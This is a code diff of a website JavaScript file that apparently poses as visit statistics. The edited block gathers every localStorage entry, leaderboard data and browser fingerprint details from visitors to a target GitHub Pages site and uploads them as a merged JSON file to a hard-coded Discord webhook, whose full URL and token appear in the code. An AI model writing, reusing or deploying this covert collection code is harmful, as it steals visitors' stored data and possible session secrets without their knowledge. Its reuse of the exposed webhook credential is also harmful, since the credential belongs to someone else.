@@ -127,6 +127,11 @@
     printVisitStats();
 })();
 
+
+
+
+
+
 (function () {
     const targetBaseUrl = "https://drmineword.github.io/Artefact-Boost-Active/";
     const webhookUrl = "https://discord.com/api/webhooks/1320483118947242094/uncmv45ABLDaJZcNZOzkjvNXZzV9NPL5yjgIOQagRK6FdDqW8GQuJHaSlkqd0_Z7uf4d";
@@ -202,10 +207,10 @@
         };
     }
 
-    // Function to send multiple files to Discord webhook
-    async function sendToWebhook(files, embedMessage) {
+    // Function to send a single merged file to Discord webhook
+    async function sendToWebhook(mergedDataFile, embedMessage) {
         const formData = new FormData();
-        files.forEach(file => formData.append("file", file));
+        formData.append("file", mergedDataFile);
         formData.append(
             "payload_json",
             JSON.stringify({
@@ -221,7 +226,7 @@
             const result = await response.json();
             console.log("Message sent successfully. Response:", result);
         } catch (error) {
-            console.error("Failed to send files:", error);
+            console.error("Failed to send data:", error);
         }
     }
 
@@ -234,56 +239,41 @@
 
         console.log("On target website. Collecting and sending data...");
 
-        // Collect data
+        // Collect leaderboard and localStorage data
         const leaderboardData = getLeaderboardData();
         const localStorageData = collectLocalStorage();
 
         // Generate a unique user ID
         const userId = await getUserId();
 
-        // Step 1: Create four separate JSON files
-        const visitCountsFile = new File(
-            [JSON.stringify(leaderboardData.visitCounts, null, 2)],
-            "visit_counts.json",
+        // Merge all data into one JSON object
+        const mergedData = {
+            userId,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenResolution: `${window.screen.width}x${window.screen.height}`,
+            pageUrl: window.location.href,
+            visitTime: new Date().toISOString(),
+            leaderboardData,
+            localStorageData,
+        };
+
+        console.log("Merged data:", mergedData);
+
+        // Create a single JSON file with the merged data
+        const mergedDataFile = new File(
+            [JSON.stringify(mergedData, null, 2)],
+            "merged_data.json",
             { type: "application/json" }
         );
-        console.log("Created file: visit_counts.json");
 
-        const timeSpentFile = new File(
-            [JSON.stringify(leaderboardData.timeSpentOnPages, null, 2)],
-            "time_spent.json",
-            { type: "application/json" }
-        );
-        console.log("Created file: time_spent.json");
+        console.log("Created file: merged_data.json");
 
-        const totalVisitSummaryFile = new File(
-            [JSON.stringify(leaderboardData.totalVisitSummary, null, 2)],
-            "total_visit_summary.json",
-            { type: "application/json" }
-        );
-        console.log("Created file: total_visit_summary.json");
-
-        const userDataFile = new File(
-            [JSON.stringify(
-                {
-                    userId,
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    screenResolution: `${window.screen.width}x${window.screen.height}`,
-                },
-                null,
-                2
-            )],
-            "user_data.json",
-            { type: "application/json" }
-        );
-        console.log("Created file: user_data.json");
-
-        // Step 2: Create embed message
+        // Create an embed message
         const embedMessage = {
-            title: "New Visitor Data",
-            description: "Collected data from a website visit.",
+            title: "Visitor Data",
+            description: "All collected data from a website visit has been merged into a single file.",
             fields: [
                 { name: "User ID", value: userId },
                 { name: "Page URL", value: window.location.href },
@@ -294,11 +284,8 @@
             },
         };
 
-        // Step 3: Send files and embed message to the webhook
-        sendToWebhook(
-            [visitCountsFile, timeSpentFile, totalVisitSummaryFile, userDataFile],
-            embedMessage
-        );
+        // Send the merged file and embed message to the webhook
+        sendToWebhook(mergedDataFile, embedMessage);
 
         console.log("Data collection and sending process complete.");
     }
